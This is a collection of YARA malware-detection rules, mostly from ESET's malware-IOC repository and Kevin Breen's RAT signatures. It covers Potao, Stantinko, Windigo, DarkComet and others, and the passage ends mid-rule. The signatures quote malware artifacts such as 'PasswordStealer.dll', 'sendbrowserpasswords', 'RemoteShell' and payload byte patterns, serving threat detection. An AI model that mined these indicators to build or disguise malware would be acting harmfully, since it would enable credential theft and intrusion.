// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//
private rule PotaoDecoy
{
    strings:
        $mz = { 4d 5a }
        $str1 = "eroqw11"
        $str2 = "2sfsdf"
        $str3 = "RtlDecompressBuffer"
        $wiki_str = "spanned more than 100 years and ruined three consecutive" wide

        $old_ver1 = {53 68 65 6C 6C 33 32 2E 64 6C 6C 00 64 61 66 73 72 00 00 00 64 61 66 73 72 00 00 00 64 6F 63 (00 | 78)}
        $old_ver2 = {6F 70 65 6E 00 00 00 00 64 6F 63 00 64 61 66 73 72 00 00 00 53 68 65 6C 6C 33 32 2E 64 6C 6C 00}       
    condition:
        ($mz at 0) and ( (all of ($str*)) or any of ($old_ver*) or $wiki_str )
}
private rule PotaoDll
{
    strings:
        $mz = { 4d 5a }
        
        $dllstr1 = "?AVCncBuffer@@"
        $dllstr2 = "?AVCncRequest@@"
        $dllstr3 = "Petrozavodskaya, 11, 9"
        $dllstr4 = "_Scan@0"
        $dllstr5 = "\x00/sync/document/"
        $dllstr6 = "\\temp.temp"
        
        $dllname1 = "node69MainModule.dll"
        $dllname2 = "node69-main.dll"
        $dllname3 = "node69MainModuleD.dll"
        $dllname4 = "task-diskscanner.dll"
        $dllname5 = "\x00Screen.dll"
        $dllname6 = "Poker2.dll"        
        $dllname7 = "PasswordStealer.dll"
        $dllname8 = "KeyLog2Runner.dll" 
        $dllname9 = "GetAllSystemInfo.dll"          
        $dllname10 = "FilePathStealer.dll"          
    condition:
        ($mz at 0) and (any of ($dllstr*) and any of ($dllname*))
}
private rule PotaoUSB
{
    strings:
        $mz = { 4d 5a }
        
        $binary1 = { 33 C0 8B C8 83 E1 03 BA ?? ?? ?? 00 2B D1 8A 0A 32 88 ?? ?? ?? 00 2A C8 FE C9 88 88 ?? ?? ?? 00 40 3D ?? ?? 00 00 7C DA C3 }
        $binary2 = { 55 8B EC 51 56 C7 45 FC 00 00 00 00 EB 09 8B 45 FC 83 C0 01 89 45 FC 81 7D FC ?? ?? 00 00 7D 3D 8B 4D FC 0F BE 89 ?? ?? ?? 00 8B 45 FC 33 D2 BE 04 00 00 00 F7 F6 B8 03 00 00 00 2B C2 0F BE 90 ?? ?? ?? 00 33 CA 2B 4D FC 83 E9 01 81 E1 FF 00 00 00 8B 45 FC 88 88 ?? ?? ?? 00 EB B1 5E 8B E5 5D C3}
    condition:
        ($mz at 0) and any of ($binary*)
}
private rule PotaoSecondStage
{
    strings:
        $mz = { 4d 5a }
        // hash of CryptBinaryToStringA and CryptStringToBinaryA
        $binary1 = {51 7A BB 85 [10-180] E8 47 D2 A8}
        // old hash of CryptBinaryToStringA and CryptStringToBinaryA
        $binary2 = {5F 21 63 DD [10-30] EC FD 33 02}
        $binary3 = {CA 77 67 57 [10-30] BA 08 20 7A}
        
        $str1 = "?AVCrypt32Import@@"
        $str2 = "%.5llx"
    condition:
        ($mz at 0) and any of ($binary*) and any of ($str*)
}
rule Potao
{
    meta:
        Author      = "Anton Cherepanov"
        Date        = "2015/07/29"
        Description = "Operation Potao"
        Reference   = "http://www.welivesecurity.com/wp-content/uploads/2015/07/Operation-Potao-Express_final_v2.pdf"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "threatintel@eset.com"
        License = "BSD 2-Clause"
    condition:
        PotaoDecoy or PotaoDll or PotaoUSB or PotaoSecondStage
}
// Linux/Rakos yara rule
// https://github.com/eset/malware-ioc/
//
// These yara rules are provided to the community under the two-clause BSD
// license as follows:
//
// Copyright (c) 2016, ESET
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice, this
// list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright notice,
// this list of conditions and the following disclaimer in the documentation
// and/or other materials provided with the distribution.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//


rule linux_rakos
{
    meta:
        description = "Linux/Rakos.A executable"
        author = "Peter Kálnai"
        date = "2016-12-13"
        reference = "http://www.welivesecurity.com/2016/12/20/new-linuxrakos-threat-devices-servers-ssh-scan/"
        version = "1"
        contact = "threatintel@eset.com"
        license = "BSD 2-Clause"


    strings:
        $ = "upgrade/vars.yaml"
        $ = "MUTTER"
        $ = "/tmp/.javaxxx"
        $ = "uckmydi"

    condition:
        3 of them
}
// Stantinko yara rules
// https://github.com/eset/malware-ioc/
//
// These yara rules are provided to the community under the two-clause BSD
// license as follows:
//
// Copyright (c) 2017, ESET
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice, this
// list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright notice,
// this list of conditions and the following disclaimer in the documentation
// and/or other materials provided with the distribution.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//

import "pe"

rule beds_plugin {

    meta:
        Author      = "Frédéric Vachon"
        Date        = "2017-07-17"
        Description = "Stantinko BEDS' plugins"
        Reference   = "https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "github@eset.com"
        License = "BSD 2-Clause"

    condition:
        pe.exports("CheckDLLStatus") and
        pe.exports("GetPluginData") and
        pe.exports("InitializePlugin") and
        pe.exports("IsReleased") and
        pe.exports("ReleaseDLL")
}

rule beds_dropper {

    meta:
        Author      = "Frédéric Vachon"
        Date        = "2017-07-17"
        Description = "BEDS dropper"
        Reference   = "https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "github@eset.com"
        License = "BSD 2-Clause"

    condition:
        pe.imphash() == "a7ead4ef90d9981e25728e824a1ba3ef"
        
}

rule facebook_bot {

    meta:
        Author      = "Frédéric Vachon"
        Date        = "2017-07-17"
        Description = "Stantinko's Facebook bot"
        Reference   = "https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "github@eset.com"
        License = "BSD 2-Clause"

    strings:
        $s1 = "m_upload_pic&return_uri=https%3A%2F%2Fm.facebook.com%2Fprofile.php" fullword ascii
        $s2 = "D:\\work\\brut\\cms\\facebook\\facebookbot\\Release\\facebookbot.pdb" fullword ascii
        $s3 = "https%3A%2F%2Fm.facebook.com%2Fcomment%2Freplies%2F%3Fctoken%3D" fullword ascii
        $s4 = "reg_fb_gate=https%3A%2F%2Fm.facebook.com%2Freg" fullword ascii
        $s5 = "reg_fb_ref=https%3A%2F%2Fm.facebook.com%2Freg%2F" fullword ascii
        $s6 = "&return_uri_error=https%3A%2F%2Fm.facebook.com%2Fprofile.php" fullword ascii

        $x1 = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36" fullword ascii
        $x2 = "registration@facebookmail.com" fullword ascii
        $x3 = "https://m.facebook.com/profile.php?mds=" fullword ascii
        $x4 = "https://upload.facebook.com/_mupload_/composer/?profile&domain=" fullword ascii
        $x5 = "http://staticxx.facebook.com/connect/xd_arbiter.php?version=42#cb=ff43b202c" fullword ascii
        $x6 = "https://upload.facebook.com/_mupload_/photo/x/saveunpublished/" fullword ascii
        $x7 = "m.facebook.com&ref=m_upload_pic&waterfall_source=" fullword ascii
        $x8 = "payload.commentID" fullword ascii
        $x9 = "profile.login" fullword ascii

   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( 1 of ($s*) or 3 of ($x*) ) ) or ( all of them )
}

rule pds_plugins {
 
    meta:
        Author      = "Frédéric Vachon"
        Date        = "2017-07-17"
        Description = "Stantinko PDS' plugins"
        Reference   = "https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "github@eset.com"
        License = "BSD 2-Clause"

    strings:
        $s1 = "std::_Vector_val<CHTTPPostItem *,std::allocator<CHTTPPostItem *> >" fullword ascii
        $s2 = "std::_Vector_val<CHTTPHeader *,std::allocator<CHTTPHeader *> >" fullword ascii
        $s3 = "std::vector<CHTTPHeader *,std::allocator<CHTTPHeader *> >" fullword ascii
        $s4 = "std::vector<CHTTPPostItem *,std::allocator<CHTTPPostItem *> >" fullword ascii
        $s5 = "CHTTPHeaderManager" fullword ascii
        $s6 = "CHTTPPostItemManager *" fullword ascii
        $s7 = "CHTTPHeaderManager *" fullword ascii
        $s8 = "CHTTPPostItemManager" fullword ascii
        $s9 = "CHTTPHeader" fullword ascii
        $s10 = "CHTTPPostItem" fullword ascii
        $s11 = "std::vector<CCookie *,std::allocator<CCookie *> >" fullword ascii
        $s12 = "std::_Vector_val<CCookie *,std::allocator<CCookie *> >" fullword ascii
        $s13 = "CCookieManager *" fullword ascii

    condition:
        ( uint16(0) == 0x5a4d and filesize < 1000KB and ( 2 of ($s*) ) )
}

rule stantinko_pdb {

    meta:
        Author      = "Frédéric Vachon"
        Date        = "2017-07-17"
        Description = "Stantinko malware family PDB path"
        Reference   = "https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "github@eset.com"
        License = "BSD 2-Clause"

    strings:
        $s1 = "D:\\work\\service\\service\\" ascii

    condition:
        all of them
}

rule stantinko_droppers {

    meta:
        Author      = "Marc-Etienne M.Léveillé"
        Date        = "2017-07-17"
        Description = "Stantinko droppers"
        Reference   = "https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "github@eset.com"
        License = "BSD 2-Clause"

    strings:
        // Bytes from the encrypted payload
        $s1 = {55 8B EC 83 EC 08 53 56 BE 80 F4 45 00 57 81 EE 80 0E 41 00 56 E8 6D 23 00 00 56 8B D8 68 80 0E 41 00 53 89 5D F8 E8 65 73 00 00 8B 0D FC F5 45}

        // Keys to decrypt payload
        $s2 = {7E 5E 7F 8C 08 46 00 00 AB 57 1A BB 91 5C 00 00 FA CC FD 76 90 3A 00 00}

    condition:
        uint16(0) == 0x5A4D and 1 of them
}

rule stantinko_d3d {

    meta:
        Author      = "Marc-Etienne M.Léveillé"
        Date        = "2017-07-17"
        Description = "Stantinko d3dadapter component"
        Reference   = "https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "github@eset.com"
        License = "BSD 2-Clause"

    condition:
        pe.exports("EntryPoint") and
        pe.exports("ServiceMain") and
        pe.imports("WININET.DLL", "HttpAddRequestHeadersA")
}

rule stantinko_ihctrl32 {

    meta:
        Author      = "Marc-Etienne M.Léveillé"
        Date        = "2017-07-17"
        Description = "Stantinko ihctrl32 component"
        Reference   = "https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "github@eset.com"
        License = "BSD 2-Clause"

    strings:
        $s1 = "ihctrl32.dll"
        $s2 = "win32_hlp"
        $s3 = "Ihctrl32Main"
        $s4 = "I%citi%c%size%s%c%ci%s"
        $s5 = "Global\\Intel_hctrl32"

    condition:
        2 of them
}

rule stantinko_wsaudio {

    meta:
        Author      = "Marc-Etienne M.Léveillé"
        Date        = "2017-07-17"
        Description = "Stantinko wsaudio component"
        Reference   = "https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "github@eset.com"
        License = "BSD 2-Clause"

    strings:
        // Export
        $s1 = "GetInterface"
        $s2 = "wsaudio.dll"

        // Event name
        $s3 = "Global\\Wsaudio_Initialize"
        $s4 = "SOFTWARE\\Classes\\%s.FieldListCtrl.1\\"

    condition:
        2 of them
}

rule stantinko_ghstore {

    meta:
        Author      = "Marc-Etienne M.Léveillé"
        Date        = "2017-07-17"
        Description = "Stantinko ghstore component"
        Reference   = "https://www.welivesecurity.com/wp-content/uploads/2017/07/Stantinko.pdf"
        Source = "https://github.com/eset/malware-ioc/"
        Contact = "github@eset.com"
        License = "BSD 2-Clause"

    strings:
        $s1 = "G%cost%sSt%c%s%s%ce%sr" wide
        $s2 = "%cho%ct%sS%sa%c%s%crve%c" wide
        $s3 = "Par%c%ce%c%c%s" wide
        $s4 = "S%c%curity%c%s%c%s" wide
        $s5 = "Sys%c%s%c%c%su%c%s%clS%c%s%serv%s%ces" wide

    condition:
        3 of them
}
// Operation Windigo yara rules
// For feedback or questions contact us at: windigo@eset.sk
// https://github.com/eset/malware-ioc/
//
// These yara rules are provided to the community under the two-clause BSD
// license as follows:
//
// Copyright (c) 2014, ESET
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// 1. Redistributions of source code must retain the above copyright notice, this
// list of conditions and the following disclaimer.
//
// 2. Redistributions in binary form must reproduce the above copyright notice,
// this list of conditions and the following disclaimer in the documentation
// and/or other materials provided with the distribution.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
//
rule onimiki
{
  meta:
    description = "Linux/Onimiki malicious DNS server"
    malware = "Linux/Onimiki"
    operation = "Windigo"
    author = "Olivier Bilodeau <bilodeau@eset.com>"
    created = "2014-02-06"
    reference = "http://www.welivesecurity.com/wp-content/uploads/2014/03/operation_windigo.pdf"
    contact = "windigo@eset.sk"
    source = "https://github.com/eset/malware-ioc/"
    license = "BSD 2-Clause"

  strings:
    // code from offset: 0x46CBCD
    $a1 = {43 0F B6 74 2A 0E 43 0F  B6 0C 2A 8D 7C 3D 00 8D}
    $a2 = {74 35 00 8D 4C 0D 00 89  F8 41 F7 E3 89 F8 29 D0}
    $a3 = {D1 E8 01 C2 89 F0 C1 EA  04 44 8D 0C 92 46 8D 0C}
    $a4 = {8A 41 F7 E3 89 F0 44 29  CF 29 D0 D1 E8 01 C2 89}
    $a5 = {C8 C1 EA 04 44 8D 04 92  46 8D 04 82 41 F7 E3 89}
    $a6 = {C8 44 29 C6 29 D0 D1 E8  01 C2 C1 EA 04 8D 04 92}
    $a7 = {8D 04 82 29 C1 42 0F B6  04 21 42 88 84 14 C0 01}
    $a8 = {00 00 42 0F B6 04 27 43  88 04 32 42 0F B6 04 26}
    $a9 = {42 88 84 14 A0 01 00 00  49 83 C2 01 49 83 FA 07}

  condition:
    all of them
}
rule AAR
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/AAR"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "Hashtable"
		$b = "get_IsDisposed"
		$c = "TripleDES"
		$d = "testmemory.FRMMain.resources"
		$e = "$this.Icon" wide
		$f = "{11111-22222-20001-00001}" wide
		$g = "@@@@@"

	condition:
		all of them
}

rule adWind
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/AAR"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$meta = "META-INF"
		$conf = "config.xml"
		$a = "Adwind.class"
		$b = "Principal.adwind"

	condition:
		all of them
}

rule Adzok
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		Description = "Adzok Rat"
		Versions = "Free 1.0.0.3,"
		date = "2015/05"
		ref = "http://malwareconfig.com/stats/Adzok"
		maltype = "Remote Access Trojan"
		filetype = "jar"

	strings:
		$a1 = "config.xmlPK"
		$a2 = "key.classPK"
		$a3 = "svd$1.classPK"
		$a4 = "svd$2.classPK"
    $a5 = "Mensaje.classPK"
		$a6 = "inic$ShutdownHook.class"
		$a7 = "Uninstall.jarPK"
		$a8 = "resources/icono.pngPK"
        
	condition:
    7 of ($a*)
}
rule AlienSpy
{
    meta:
        author = "Kevin Breen"
        ref = "http://malwareconfig.com/stats/AlienSpy"
        maltype = "Remote Access Trojan"
        filetype = "jar"

    strings:
        $PK = "PK"
        $MF = "META-INF/MANIFEST.MF"
    
        $a1 = "a.txt"
        $a2 = "b.txt"
        $a3 = "Main.class"
    
        $b1 = "ID"
        $b2 = "Main.class"
        $b3 = "plugins/Server.class"
    
        $c1 = "resource/password.txt"
        $c2 = "resource/server.dll"
    
        $d1 = "java/stubcito.opp"
        $d2 = "java/textito.isn"
    
        $e1 = "java/textito.text"
        $e2 = "java/resources.xsx"
    
        $f1 = "amarillo/asdasd.asd"
        $f2 = "amarillo/adqwdqwd.asdwf"

        $g1 = "config/config.perl"
        $g2 = "main/Start.class"
        
        $o1 = "config/config.ini"
        $o2 = "windows/windows.ini"
        $o3 = "components/linux.plsk"
        $o4 = "components/manifest.ini"
        $o5 = "components/mac.hwid"
        

    condition:
        $PK at 0 and $MF and
        (all of ($a*) or all of ($b*) or all of ($c*) or all of ($d*) or all of ($e*) or all of ($f*) or all of ($g*) or any of ($o*))
}
rule Ap0calypse
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Ap0calypse"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "Ap0calypse"
		$b = "Sifre"
		$c = "MsgGoster"
		$d = "Baslik"
		$e = "Dosyalars"
		$f = "Injecsiyon"

	condition:
		all of them
}
rule Arcom
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Arcom"
		maltype = "Remote Access Trojan"
		filetype = "exe"
        
    strings:
        $a1 = "CVu3388fnek3W(3ij3fkp0930di"
        $a2 = "ZINGAWI2"
        $a3 = "clWebLightGoldenrodYellow"
        $a4 = "Ancestor for '%s' not found" wide
        $a5 = "Control-C hit" wide
        $a6 = {A3 24 25 21}
        
    condition:
        all of them
}

rule Bandook
{

	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/bandook"
		maltype = "Remote Access Trojan"
		filetype = "exe"
        
    strings:
    		$a = "aaaaaa1|"
            $b = "aaaaaa2|"
            $c = "aaaaaa3|"
            $d = "aaaaaa4|"
			$e = "aaaaaa5|"
			$f = "%s%d.exe"
			$g = "astalavista"
			$h = "givemecache"
			$i = "%s\\system32\\drivers\\blogs\\*"
			$j = "bndk13me"
			

        
    condition:
    		all of them
}

rule BlackNix
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/BlackNix"
		maltype = "Remote Access Trojan"
		filetype = "exe"
        
    strings:
		$a1 = "SETTINGS" wide
		$a2 = "Mark Adler"
		$a3 = "Random-Number-Here"
		$a4 = "RemoteShell"
		$a5 = "SystemInfo"

	
	condition:
		all of them
}

rule BlackShades
{
    meta:
        author = "Brian Wallace (@botnet_hunter)"
        date = "2014/04"
        ref = "http://malwareconfig.com/stats/PoisonIvy"
        ref = "http://blog.cylance.com/a-study-in-bots-blackshades-net"
        family = "blackshades"

    strings:
        $string1 = "bss_server"
        $string2 = "txtChat"
        $string3 = "UDPFlood"
    condition:
        all of them
}

rule BlueBanana
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/BlueBanana"
		maltype = "Remote Access Trojan"
		filetype = "Java"

	strings:
		$meta = "META-INF"
		$conf = "config.txt"
		$a = "a/a/a/a/f.class"
		$b = "a/a/a/a/l.class"
		$c = "a/a/a/b/q.class"
		$d = "a/a/a/b/v.class"

		
	condition:
		all of them
}

rule Bozok
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Bozok"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "getVer" nocase
		$b = "StartVNC" nocase
		$c = "SendCamList" nocase
		$d = "untPlugin" nocase
		$e = "gethostbyname" nocase
	
	condition:
		all of them
}

rule ClientMesh
{
    meta:
        author = "Kevin Breen <kevin@techanarchy.net>"
        date = "2014/06"
        ref = "http://malwareconfig.com/stats/ClientMesh"
        family = "torct"

    strings:
        $string1 = "machinedetails"
        $string2 = "MySettings"
        $string3 = "sendftppasswords"
        $string4 = "sendbrowserpasswords"
        $string5 = "arma2keyMass"
        $string6 = "keylogger"
        /*$conf = {00 00 00 00 00 00 00 00 00 7E}*/

    condition:
        all of them
}
rule Crimson
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		Description = "Crimson Rat"
		date = "2015/05"
		ref = "http://malwareconfig.com/stats/Crimson"
		maltype = "Remote Access Trojan"
		filetype = "jar"

	strings:
		$a1 = "com/crimson/PK"
		$a2 = "com/crimson/bootstrapJar/PK"
		$a3 = "com/crimson/permaJarMulti/PermaJarReporter$1.classPK"
		$a4 = "com/crimson/universal/containers/KeyloggerLog.classPK"
        $a5 = "com/crimson/universal/UploadTransfer.classPK"
        
	condition:
        all of ($a*)
}

rule CyberGate
{

	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/CyberGate"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$string1 = {23 23 23 23 40 23 23 23 23 E8 EE E9 F9 23 23 23 23 40 23 23 23 23}
		$string2 = {23 23 23 23 40 23 23 23 23 FA FD F0 EF F9 23 23 23 23 40 23 23 23 23}
		$string3 = "EditSvr"
		$string4 = "TLoader"
		$string5 = "Stroks"
		$string6 = "####@####"
		$res1 = "XX-XX-XX-XX"
		$res2 = "CG-CG-CG-CG"

	condition:
		all of ($string*) and any of ($res*)
}

rule DarkComet
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/DarkComet"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		// Versions 2x
		$a1 = "#BOT#URLUpdate"
		$a2 = "Command successfully executed!"
		$a3 = "MUTEXNAME" wide
		$a4 = "NETDATA" wide
		// Versions 3x & 4x & 5x
		$b1 = "FastMM Borland Edition"
		$b2 = "%s, ClassID: %s"
		$b3 = "I wasn't able to open the hosts file"
		$b4 = "#BOT#VisitUrl"
		$b5 = "#KCMDDC"



	condition:
		all of ($a*) or all of ($b*)
}

rule DarkRAT
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/DarkRAT"
		maltype = "Remote Access Trojan"
		filetype = "exe"

	strings:
		$a = "@1906dark1996coder@"
		$b = "SHEmptyRecycleBinA"
		$c = "mciSendStringA"
		$d = "add_Shutdown"
		$e = "get_SaveMySettingsOnExit"
		$f = "get_SpecialDirectories"
		$g = "Client.My"

	condition:
		all of them
}

rule Greame
{
	meta:
		author = " Kevin Breen <kevin@techanarchy.net>"
		date = "2014/04"
		ref = "http://malwareconfig.com/stats/Greame"
		maltype = "Remote Access Trojan"
		filetype = "exe"
		
	strings:
    		$a = {23 23 23 23 40 23 23 23 23 E8 EE E9 F9 23 23 23 23 40 23 23 23 23}
            $b = {23 23 23 23 40 23 23 23 23 FA FD F0 EF F9 23 23 23 23 40 23 23 23 23}
            $c = "EditSvr"
            $d = "TLoader"
			$e = "Stroks"
            $f = "Avenger by NhT"
			$g = "####@####"
			$h = "GREAME"
			

        
    condition:
    		all of them
}

rule Hangover_ron_babylon
{
  strings:
    $a = "Content-Disposition: form-data; name=\"uploaddir\""
    $b1 = "MBVDFRESCT"
    $b2 = "EMSCBVDFRT"
    $b3 = "EMSFRTCBVD"
    $b4= "sendFile"
    $b5 = "BUGMAAL"
    $b6 = "sMAAL"
    $b7 = "SIMPLE"
    $b8 = "SPLIME"
    $b9 = "getkey.php"
    $b10 = "MBVDFRESCT"
    $b11 = "DSMBVCTFRE"
    $b12 = "MBESCVDFRT"
    $b13 = "TCBFRVDEMS"
    $b14 = "DEMOMAKE"
    $b15 = "DEMO"
    $b16 = "UPHTTP"
    

    $c1 = "F39D45E70395ABFB8D8D2BFFC8BBD152"
    $c2 = "90B452BFFF3F395ABDC878D8BEDBD152"
    $c3 = "FFF3F395A90B452BB8BEDC878DDBD152"
    $c4 = "5A9DCB8FFF3F02B8B45BE39D152"
    $c5 = "5A902B8B45BEDCB8FFF3F39D152"
    $c6 = "78DDB5A902BB8FFF3F398B45BEDCD152"
    $c7 = "905ABEB452BFFFBDC878D83F39DBD152"
    $c8 = "D2BFFC8BBD152F3B8D89D45E70395ABF"
    $c9 = "8765F3F395A90B452BB8BEDC878"
    $c10 = "90ABDC878D8BEDBB452BFFF3F395D152"
    $c11 = "F12BDC94490B452AA8AEDC878DCBD187"
    
  condition:
    $a and (1 of ($b*) or 1 of ($c*))
    
}

rule Hangover_Fuddol {
    strings:
        $a = "\\Http downloader(fud)"
        $b = "Fileexists"
    condition:
        all of them

}

rule Hangover_UpdateEx {
    strings:
        $a1 = "UpdateEx"
        $a2 = "VBA6.DLL"
        $a3 = "MainEx"
        $a4 = "GetLogs"
        $a5 = "ProMan"
        $a6 = "RedMod"
        
    condition:
        all of them

}

rule Hangover_Tymtin_Degrab {
    strings:
        $a1 = "&dis=no&utp=op&mfol="
        $a2 = "value1=1&value2=2"
        
    condition:
        all of them

}


rule Hangover_Smackdown_Downloader {
    strings:
        $a1 = "DownloadComplete"
        $a2 = "DownloadProgress"
        $a3 = "DownloadError"
        $a4 = "UserControl"
        $a5 = "MSVBVM60.DLL"

        $b1 = "syslide"
        $b2 = "frmMina"
        $b3 = "Soundsman"
        $b4 = "New_upl"
        $b5 = "MCircle"
        $b6 = "shells_DataArrival"
        
    condition:
        3 of ($a*) and 1 of ($b*)

}


rule Hangover_Vacrhan_Downloader {
    strings:
        $a1 = "pranVacrhan"
